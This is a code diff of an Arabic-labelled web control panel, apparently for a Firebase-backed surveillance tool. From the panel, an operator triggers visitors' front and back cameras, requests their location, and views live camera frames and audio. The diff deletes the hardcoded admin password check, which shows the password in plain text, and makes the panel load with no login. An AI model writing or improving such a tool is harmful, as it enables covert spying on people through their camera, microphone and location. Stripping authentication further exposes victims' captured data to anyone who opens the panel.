@@ -37,7 +37,7 @@
 
 <div class="panel" id="controlPanel" style="display:none;">
   <h2>مراقبة: <span id="selectedId"></span></h2>
-  
+ 
   <button onclick="sendCommand('frontCamera')" style="background:#3b82f6;color:white;">📸 كاميرا أمامية</button>
   <button onclick="sendCommand('backCamera')" style="background:#ef4444;color:white;">📸 كاميرا خلفية</button>
   <button onclick="sendCommand('requestLocation')" style="background:#10b981;color:white;">📍 تحديث الموقع</button>
@@ -68,26 +68,16 @@
 
   let selectedVisitor = null;
 
-  function login() {
-    const pass = prompt("كلمة مرور الإدارة:");
-    if (pass === "521988") loadVisitors();
-    else alert("كلمة مرور خاطئة");
-  }
-
   function loadVisitors() {
     db.ref('visitors').on('value', snap => {
       let html = '';
       snap.forEach(child => {
         const d = child.val();
-        let statusHTML = '';
-
-        if (d.consentStatus === "granted") {
-          statusHTML = '<span class="status-granted">✅ موافق</span>';
-        } else if (d.consentStatus === "denied") {
-          statusHTML = '<span class="status-denied">❌ رفض</span>';
-        } else {
-          statusHTML = '<span class="status-pending">⏳ في انتظار</span>';
-        }
+        let statusHTML = d.consentStatus === "granted" ? 
+          '<span class="status-granted">✅ موافق</span>' : 
+          d.consentStatus === "denied" ? 
+          '<span class="status-denied">❌ رفض</span>' : 
+          '<span class="status-pending">⏳ في انتظار</span>';
 
         html += `<tr onclick="selectVisitor('${child.key}')">
           <td>${child.key}</td>
@@ -114,17 +104,13 @@
     db.ref('commands/' + selectedVisitor).set({ type: type, time: Date.now() });
   }
 
-  // watchLiveFrame, watchLocation, watchLiveAudio ... (نفس الكود السابق)
- function watchLiveFrame(id) {
-  const img = document.getElementById('live-img');
-  
-  db.ref('live/' + id + '/frame').on('value', snap => {
-    const f = snap.val();
-    if (f && f.data) {
-      img.src = f.data;
-    }
-  });
-}
+  function watchLiveFrame(id) {
+    db.ref('live/' + id + '/frame').on('value', snap => {
+      const f = snap.val();
+      if (f && f.data) document.getElementById('live-img').src = f.data;
+    });
+  }
+
   function watchLocation(id) {
     db.ref('visitors/' + id + '/location').on('value', snap => {
       const loc = snap.val();
@@ -140,12 +126,13 @@
       const a = snap.val();
       if (a && a.data) {
         document.getElementById('live-audio').src = a.data;
-        document.getElementById('live-audio').play().catch(()=>{});
+        document.getElementById('live-audio').play().catch(() => {});
       }
     });
   }
 
-  window.onload = login;
+  // تشغيل تلقائي بدون كلمة سر
+  window.onload = loadVisitors;
 </script>
 </body>
 </html>
